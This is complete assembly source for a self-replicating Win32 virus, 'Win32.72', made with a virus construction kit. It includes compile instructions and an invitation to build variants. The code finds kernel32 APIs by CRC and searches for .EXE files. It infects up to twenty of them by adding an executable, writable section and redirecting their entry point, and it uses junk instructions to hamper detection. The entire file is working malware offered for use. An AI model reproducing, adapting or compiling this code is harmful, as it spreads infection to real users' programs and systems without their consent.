              
;
;
; Win32.72 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.72
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/14/2016
;  Infection Mark         : 72
;  Infection Type         : adding a new section 
;  API Search             : Simple CRC I
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 18
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m2 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 12d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 pop ebx
 sub ebx, offset Delta
                                        ; mov ebp, ebx
 push ebx
 pop ebp
 jmp KernelSearchStart


;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...
                                        ; store old EIP and ImageBase
 mov edx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], 0
 add dword ptr [ebp+retBase], edx

 mov esi, dword ptr [ebp+OldEIP]

 push esi
 pop dword ptr [ebp+retEIP]




;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 lea edx, [ebp+filemask]
 xchg ebx, edx

                                        ; Find File to infect
 call FindFirstFileProc
                                        ; add eax, 1
 sub eax, -1d
 test eax, eax
 jz EndInfectCurDir
                                        ; Set Infection Counter
 push 20d
 inc edx                                ; Trash
 pop dword ptr [ebp+InfCounter]

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 mov edx, dword ptr [ebp+InfCounter]
 cmp edx, 0
 je EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 cmp eax, 0
 jne InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
                                        ; clear ebx
 and ebx, 0
 xor ebx, dword ptr [ebp+FindHandle]
 push ebx
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;          [ ///// * FindFiles Procedure * \\\\\ ]

 add dword ptr [ebp+Trash1], eax        ; Trash

FindNextFileProc:                       ; find another file
 call ClearOldData
 lea edi, [ebp+WIN32_FIND_DATA]

 push edi
 push dword ptr [ebp+FindHandle]
 pop ecx
 push ecx
 call dword ptr [ebp+XFindNextFileA]
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 mov eax, ebp
 add eax, offset WIN32_FIND_DATA

 push eax
 push ebx
 adc edx, ecx                           ; Trash
 call dword ptr [ebp+XFindFirstFileA]
 push eax
 pop dword ptr [ebp+FindHandle]
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
                                        ; mov ebx, 276
 mov ebx, ( 276d xor 22d )
 xor ebx, 22d
 lea edx, [ebp+WFD_szFileName]
 xchg eax, edx


ClearOldData2:
 mov byte ptr [eax], 0h
 dec ecx                                ; Trash
                                        ; add eax, 1
 inc eax
 dec ebx
 jnz ClearOldData2
 popad
ret





;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 pop eax
 push eax
                                        ; round to pages
 sub ax, ax
                                        ; add eax, 1
 inc eax
GetKernelLoop:
                                        ; clear ecx
 sub ecx, ecx
 xor ebx, eax                           ; Trash
 add eax, -1
 mov cx, word ptr [eax+03ch]
 test cx,0f800h
 jnz GetKernelLoop
 cmp eax, dword ptr [eax+ecx+34h]
 jnz GetKernelLoop
 mov dword ptr [ebp+KernelMZ], 0
 mov dword ptr [ebp+Trash1], edx        ; Trash
 xor dword ptr [ebp+KernelMZ], eax
                                        ; add eax, 60
 dec eax
 add eax, 61d
 xor edx, ebx                           ; Trash
 mov ecx, [eax]
 sub eax, 60d
 add ecx, eax
 sar ebx, 13d                           ; Trash
 mov [KernelPE+ebp], ecx

 shr ebx, 22d                           ; Trash
 lea edx, GetApis
 add edx, ebp

 push edx
ret


;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov ebx, dword ptr [ebp+AlignReg2]
                                        ; clear edx
 and edx, 0
 mov eax, dword ptr [ebp+AlignReg1]
 div ebx
                                        ; add eax, 1
 add eax, 1d
 mul ebx
 mov dword ptr [ebp+AlignReg1], eax
 popad
ret



;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; edx Points to API-CRC ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad



                                        ; clear esi
 push 0
 pop esi
 add esi, dword ptr [ebp+KernelPE]
 and ebx, edx                           ; Trash
                                        ; get Export-Table
 mov edi, [esi+78h]
 add edi, [ebp+KernelMZ]
 shr ecx, 17d                           ; Trash
                                        ; add edi, 28
 add edi, 28d
                                        ; get ATableVA
 mov esi, dword ptr [edi]
 add esi, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], esi
                                        ; add edi, 4
 dec edi
 add edi, 5d
                                        ; get NTableVA
 mov esi, dword ptr [edi]
                                        ; add edi, 4
 add edi, 4d
 add esi, [ebp+KernelMZ]
 sal ebx, 21d                           ; Trash
 mov dword ptr [ebp+NTableVA], esi
                                        ; get OTableVA
 mov esi, dword ptr [edi]
 add esi, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], esi
                                        ; clear eax
 mov eax, 0
 xor eax, dword ptr [ebp+NTableVA]
                                        ; clear the counter
 mov word ptr [ebp+counter], 0h


SearchNextApi1:                         ; search for the API's
 mov dword ptr [ebp+NTableTemp], eax
                                        ; mov ebx, -1
 push -1d
 pop ebx
 and ebx, dword ptr [ebp+KernelMZ]
 add ebx, dword ptr [eax]
                                        ; mov eax, ebx
 push ebx
 pop eax
                                        ; mov esi, ebx
                                        ; clear esi
 push 0
 pop esi
 add esi, ebx
 push esi
 pop dword ptr [ebp+TempApisearch2]
 mov dword ptr [ebp+TempApisearch3], edx
 cld

                                        ; esi Points to API-Name ( Kernel )
                                        ; edx Points to API-Name CRC ( Virus )
                                        ; compare Names
                                        ; simple CRC Api Search by Lethalmind
 push dword ptr [edx]
 pop ebx
 LoopChsksm:
                                        ; clear ecx
 sub ecx, ecx
 mov cl, byte ptr [esi]
                                        ; add esi, 1
 sub esi, -1d
 shl cx,8d
 sub dword ptr [ebp+Trash1], 1771825    ; Trash
 sub ebx, ecx
 test cx, cx
 jz LoopConti
                                        ; clear ecx
 mov ecx, 0
 mov cl, byte ptr [esi]
                                        ; add esi, 1
 inc esi
 sub ebx, ecx
 or cx, cx
 jnz LoopChsksm
LoopConti:
 dec ebx
 add ebx, 1
 jz FoundApi1

ApiNotFound:                            ; we did not find it :(
 mov edx, dword ptr [ebp+TempApisearch3]
 push dword ptr [ebp+NTableTemp]
 pop eax
 mov esi, dword ptr [ebp+TempApisearch2]
                                        ; add eax, 4
 inc eax
 add eax, 3d
 add word ptr [ebp+counter], 1h
 cmp word ptr [ebp+counter], 2002h
 jne SearchNextApi1
 jmp NotFoundApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
                                        ; retrieve the offset
 movzx ebx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 sal ebx, 1                             ; multiply with 2
 add ebx, dword ptr [ebp+OTableVA]
 push ebx
 pop esi
                                        ; clear ebx
 xor ebx, ebx
 mov bx, word ptr [esi]
 shl ebx, 2h
 shl eax, 1d                            ; Trash
 add ebx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov eax, dword ptr [ebx]
 add eax, dword ptr [ebp+KernelMZ]
 mov dword ptr [ebp+TempAPI], -1
 and dword ptr [ebp+TempAPI], eax
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop ecx
 popad
 jmp ExecuteHost



;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; get and remove file attributes
 mov ebx, ebp
 add ebx, offset WFD_szFileName

 push ebx
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
                                        ; mov ebx, 128
 mov ebx, ( 128d + 4d )
 sub ebx, 4d
 push ebx
 lea esi, [ebp+WFD_szFileName]
 xchg ebx, esi


 push ebx
 call dword ptr [ebp+XSetFileAttributesA]
                                        ; add eax, 1
 sub eax, -1d
 sub eax, 1
 jz NoInfection
                                        ; check for maximum filesize
 mov ebx, dword ptr [ebp+WFD_nFileSizeHigh]
 cmp ebx, 0
 jne NoInfection
                                        ; check for minimum filesize
 mov edx, offset WFD_nFileSizeLow
 add edx, ebp

 cmp dword ptr [edx], 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
                                        ; clear ebx
 mov ebx, 0
 xor ebx, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [ebx], 'ZM'
 je Goodfile
                                        ; clear edx
 mov edx, 28612d
 sub edx, 28612d
 add edx, -1
 add edx, 1
 jz Notagoodfile

Goodfile:
                                        ; clear edx
 push 0
 pop edx
 mov dx, word ptr [ebx+3Ch]
 test edx, edx
 jz Notagoodfile
 mov esi, dword ptr [ebx+3Ch]
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],esi
 jb Notagoodfile
 add esi, ebx
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [esi], 'EP'
 je Goodfile2
                                        ; clear edx
 mov edx, -25070d
 add edx, 25070d
                                        ; add edx, 1
 inc edx
 sub edx, 1
 jz Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [esi+4Ch], '72'
 jz Notagoodfile
                                        ; check for OBJ
 mov ax, word ptr [esi+16h]
 and ax, 00002h
 cmp ax, 00002h
 jne Notagoodfile
                                        ; check for DLL
 mov ax, word ptr [esi+16h]
 and ax, 0F000h
 cmp ax, 02000h
 je Notagoodfile
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
                                        ; restore the file attributes
                                        ; mov ecx, -1
 push -1d
 pop ecx
 and ecx, dword ptr [ebp+Attributes]
 push ecx
 mov ecx, ebp
 add ecx, offset WFD_szFileName

 push ecx
 call dword ptr [ebp+XSetFileAttributesA]
 jmp NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
 push 0
 push 0
 push 3
 push 0
 push 1
 mov eax, 80000000h or 40000000h
 push eax
 mov edi, ebp
 add edi, offset WFD_szFileName
 sub ebx, eax                           ; Trash

 push edi
 call dword ptr [ebp+XCreateFileA]
 sar edx, 29d                           ; Trash

 inc eax
 jz Closed
 sub eax, 1

 mov dword ptr [ebp+FileHandle], 0
 add dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
                                        ; clear ecx
 push 0
 pop ecx
 xor ecx, dword ptr [ebp+WFD_nFileSizeLow]
 push ecx

                                        ; clear ebx
 push 0
 pop ebx
 push ebx
 shl edx, 2d                            ; Trash
 push ecx
 push ebx
 push 00000004h
 push ebx
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], 0
 xor dword ptr [ebp+MapHandle], eax
 pop ecx
 sub eax, 1
 inc eax
 jz CloseFile
 push ecx
 push 0
 push 0
 rcl ebx, 15d                           ; Trash
                                        ; mov ebx, 2
 mov ebx, 0
 add ebx, 2d
 push ebx
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 cmp eax, 0
 je UnMapFile
 mov dword ptr [ebp+MapAddress], 0
 xor dword ptr [ebp+MapAddress], eax
 clc
ret
 xor edx, 33767989d                     ; Trash

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
 push NumberOfApis
 pop ecx

                                        ; load API Names and Offsets
 lea esi, [ebp+APIOffsets]

 mov edx, offset APINames
 add edx, ebp


GetApisLoop: 
 not eax                                ; Trash

                                        ; search 'em
                                        ; edx points to the CRC
                                        ; esi points to the offset

 call SearchAPI1
                                        ; add edx, 4
 dec edx
 add edx, 5d
 push dword ptr [ebp+TempAPI]
 pop eax
 mov dword ptr [esi], 0
 add dword ptr [esi], eax
                                        ; add esi, 4
 add esi, 4d
 sub ecx, 1
 jnz GetApisLoop
 lea ecx, [ebp+CheckSumMFA]
 xchg ecx, edx

 mov edi, offset Imagehlp
 add edi, ebp

 lea esi, [ebp+XCheckSumMappedFile]

                                        ; mov ebx, 1
 mov ebx, ( 1d - 19d )
 add ebx, 19d
 call GetOtherApis
 lea esi, [ebp+Outbreak]
 xchg ecx, esi

 push ecx
ret



;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov ecx, esi
 add ecx, [esi+3Ch]
                                        ; get File Alignment
                                        ; add ecx, 60
 add ecx, 60d
 mov ebx, [ecx]
 inc ecx
 add edx, ebx                           ; Trash
 sub ecx, 61d
 mov dword ptr [ebp+filealign], -1
 and dword ptr [ebp+filealign], ebx
                                        ; clear esi
 push 0
 pop esi
 add esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov edx, esi
 add edx, dword ptr [esi+3Ch]
                                        ; infection by adding a new section
                                        ; as described by Lord Julus
 mov dword ptr [ebp+PEheader], edx
                                        ; get old Entrypoint
 mov eax, dword ptr [edx+34h]
 mov dword ptr [ebp+OldBase], eax
 mov ecx, dword ptr [edx+28h]
 mov dword ptr [ebp+OldEIP], ecx
 mov ebx, [edx+38h]
 mov dword ptr [ebp+sectionalign], -1
 and dword ptr [ebp+sectionalign], ebx
                                        ; Get last section
 mov ebx, [edx+74h]
 shl ebx, 3
                                        ; clear eax
 sub eax, eax
 mov ax, word ptr [edx+6h]
 mov ecx, 28h
 pushad
 mov eax, eax
 mul ecx
 mov dword ptr [ebp+Misc1], 0
 xor dword ptr [ebp+Misc1], eax
 popad
 push dword ptr [ebp+Misc1]
 pop eax
 add edx, 78h
 add edx, ebx
 add edx, eax
 lea ecx, [ebp+newsection]
 xchg ecx, ebx


 xchg ebx, edx
 push ebx
                                        ; Calculate the RVA of the new section
 mov edx, [ebx-5*8+8d]
 add edx, [ebx-5*8+12d]
 mov eax, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], 0
 add dword ptr [ebp+AlignReg1], edx
 sbb ecx, 8d                            ; Trash
 mov dword ptr [ebp+AlignReg2], eax
 push edx
 pop dword ptr [ebp+nsphysicalsize]
 Call Align
 push dword ptr [ebp+AlignReg1]
 pop edx
 mov dword ptr [ebp + offset nsRVA], edx
                                        ;  calculate the virtual size of the new section
 mov eax, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], 0
 xor dword ptr [ebp+AlignReg1], VirusSize
 push eax
 pop dword ptr [ebp+AlignReg2]
 Call Align
                                        ; clear edx
 mov edx, -25279d
 add edx, 25279d
 add edx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsvirtualsize], edx
                                        ; calculate physical offset
 mov eax,[ebx-5*8+20d]
 add eax,[ebx-5*8+16d]
 mov edx,dword ptr [ebp + offset filealign]
 push eax
 pop dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+AlignReg2], -1
 and dword ptr [ebp+AlignReg2], edx
 Call Align
 mov ebx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsphysicaloffset], 0
 xor dword ptr [ebp+nsphysicaloffset], ebx
                                        ; calculate new size
 push dword ptr [ebp+filealign]
 pop ecx
 mov edx, ebx
 mov dword ptr [ebp+AlignReg2], ecx
 add edx, VirusSize
 push edx
 pop dword ptr [ebp+AlignReg1]
 call Align
 mov edx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], 0
 mov dword ptr [ebp+Trash1], eax        ; Trash
 add dword ptr [ebp+NewSize], edx
 pushad
 Call UnMapFile2
 adc dword ptr [ebp+Trash1], 1012212    ; Trash
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], 0
 add dword ptr [ebp+WFD_nFileSizeLow], edx
 call CreateMap
 jc NoEXE
                                        ; mov ebx, 16
 mov ebx, ( 16d - 11d )
 add ebx, 11d
 pop eax
 lea ecx, [ebp+newsection]

WriteNewSectionLoop:
 mov edx, dword ptr [ecx]
 mov dword ptr [eax], edx
 mov dword ptr [ebp+Trash1], 304440     ; Trash
                                        ; add ecx, 4
 add ecx, 4d
                                        ; add eax, 4
 inc eax
 add eax, 3d
 sub ebx, 1
 test ebx, ebx
 jnz WriteNewSectionLoop
                                        ; increase section numbers
                                        ; mov ebx, -1
 mov ebx, ( -1d - 12d )
 add ebx, 12d
 and ebx, dword ptr [ebp+PEheader]
 sub word ptr [ebx+06h], -1
                                        ; mov edx, -1
 mov edx, ( -1d - 7d )
 add edx, 7d
 and edx, dword ptr [ebp+nsRVA]
 mov dword ptr [ebp+NewEIP], edx
                                        ; set new EIP
 mov dword ptr  [ebx+28h], edx
                                        ; set infection mark
 mov dword ptr [ebx+4Ch], 0h
 rol edx, 21d                           ; Trash
 add dword ptr [ebx+4Ch], '72'
                                        ; clear ecx
 sub ecx, ecx
 add ecx, dword ptr [ebp+nsphysicaloffset]
 push ecx
                                        ; Append Virus
 pop edi
 mov ecx, VirusSize
 mov esi, ebp
 add esi, offset Virus

 add edi, dword ptr [ebp+MapAddress]

AppendLoop:
 rep movsb
 cmp dword ptr [ebp+XCheckSumMappedFile], -1d
 je NoCheckSum
 lea ebx, [ebp+CheckSum]
 xchg eax, ebx

 push eax
 lea ebx, [ebp+HeaderSum]

 push ebx
 push dword ptr [ebp+NewSize]
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XCheckSumMappedFile]
                                        ; mov eax, -1
 mov eax, -1d
 and eax, dword ptr [ebp+MapAddress]
 mov eax, [eax+3Ch]
 add eax, dword ptr [ebp+MapAddress]
 adc ebx, 74985944d                     ; Trash
 mov edx, dword ptr [ebp+CheckSum]
 mov dword ptr [eax+58h], edx
NoCheckSum:
                                        ; decrease Infection Counter
                                        ; clear eax
 and eax, 0
 add eax, dword ptr [ebp+InfCounter]
 add eax, -1
 push eax
 pop dword ptr [ebp+InfCounter]
 clc
ret

NoEXE:
 pop edx
 stc
ret



;        [ ///// * Retrieve non Kernel API's * \\\\\ ]

GetOtherApis:
 push edx 
 push edi
 or ecx, eax                            ; Trash
 call dword ptr [ebp+XLoadLibraryA]
 pop edx 
                                        ; mov edi, eax
 push eax
 pop edi
GetOtherApiLoop:
 push edx 
 push edx
 push edi
 call dword ptr [ebp+XGetProcAddress]
 pop edx 
 mov dword ptr [esi], eax
                                        ; add esi, 4
 add esi, 4d
 sub ebx, 1
                                        ; add ebx, 1
 inc ebx
 sub ebx, 1
 jz GetOtherApiEnd
GetOtherApiLoop2:
                                        ; add edx, 1
 add edx, 1d
 cmp byte ptr [edx], 0
 jne GetOtherApiLoop2
                                        ; add edx, 1
 sub edx, -1d
 jmp GetOtherApiLoop
GetOtherApiEnd:
ret



;                  [ ///// * Data * \\\\\ ]

Data:
 KernelPE    dd 0h
 CheckSumMFA db 'CheckSumMappedFile',0
 FileHandle  dd 0h
 HeaderSum dd 0h

 APINames:
 dd 'Ge'+'tP'+'ro'+'cA'+'dd'+'re'+'ss'
 dd 'Cr'+'ea'+'te'+'Fi'+'le'+'Ma'+'pp'+'in'+'gA'
 dd 'Ge'+'tF'+'il'+'eA'+'tt'+'ri'+'bu'+'te'+'sA'
 dd 'Lo'+'ad'+'Li'+'br'+'ar'+'yA'
 dd 'Fi'+'nd'+'Ne'+'xt'+'Fi'+'le'+'A'*100h
 dd 'Cr'+'ea'+'te'+'Fi'+'le'+'A'*100h
 dd 'Fi'+'nd'+'Cl'+'os'+'e'*100h
 dd 'Fi'+'nd'+'Fi'+'rs'+'tF'+'il'+'eA'
 dd 'Ma'+'pV'+'ie'+'wO'+'fF'+'il'+'e'*100h
 dd 'Un'+'ma'+'pV'+'ie'+'wO'+'fF'+'il'+'e'*100h
 dd 'Se'+'tF'+'il'+'eA'+'tt'+'ri'+'bu'+'te'+'sA'
 dd 'Cl'+'os'+'eH'+'an'+'dl'+'e'*100h

 filealign   dd 0h
 AlignReg1   dd 0h
 sectionalign   dd 0h
 InfCounter  dd 0h
 filemask    db '*.EXE',0
 CheckSum dd 0h

 APIOffsets:
 XGetProcAddress        dd 0h
 XCreateFileMappingA    dd 0h
 XGetFileAttributesA    dd 0h
 XLoadLibraryA          dd 0h
 XFindNextFileA         dd 0h
 XCreateFileA           dd 0h
 XFindClose             dd 0h
 XFindFirstFileA        dd 0h
 XMapViewOfFile         dd 0h
 XUnmapViewOfFile       dd 0h
 XSetFileAttributesA    dd 0h
 XCloseHandle           dd 0h

 NTableTemp  dd 0h
 db 'Virus : Win32.72 Author : SnakeByte',0
 NewEIP      dd 0h
 Attributes  dd 0h
 TempAPI     dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 Trash1      dd 0h
 XCheckSumMappedFile    dd 0h
 MapAddress  dd 0h
 Imagehlp    db 'imagehlp.dll',0
 KernelMZ    dd 0h
 NewSize     dd 0h
 MapHandle   dd 0h
 TempApisearch3 dd 0h
 OldEIP      dd 0h
 FindHandle  dd 0h
 NTableVA    dd 0h
newsection:                           ; Settings for the new section
 nsname           db '.nlLHfFd'
 nsvirtualsize    dd 0                ; Virtual Size
 nsRVA            dd 0                ; Relative Virtual Address
 nsphysicalsize   dd 0                ; Size of Raw Data
 nsphysicaloffset dd 0                ; Pointer to Size of Raw Data
 nsreserved       dd 0,0,0            ; reserved
 nsflags          db 40h,0,0,0c0h     ; Section is executable code and writeable

 Misc1       dd 0h

 PEheader    dd 0h
 OTableVA    dd 0h
 OldBase     dd 400000h
 AlignReg2   dd 0h
 counter     dw 0h
 ATableVA    dd 0h
 TempApisearch2 dd 0h




;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
                                        ; clear ebx
 mov ebx, 0
 xor ebx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], ebx

                                        ; mov edi, -1
 mov edi, -1d
 and edi, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], edi



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 test ebp, ebp
 jz FirstGenHost
 mov ebx,12345678h
 org $-4
 retEIP dd 0h
 add ebx,12345678h
 org $-4
 retBase dd 0h
 push ebx
ret



CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
                                        ; clear ebx
 mov ebx, 11888d
 sub ebx, 11888d
 push ebx
 call ExitProcess



end FakeCode

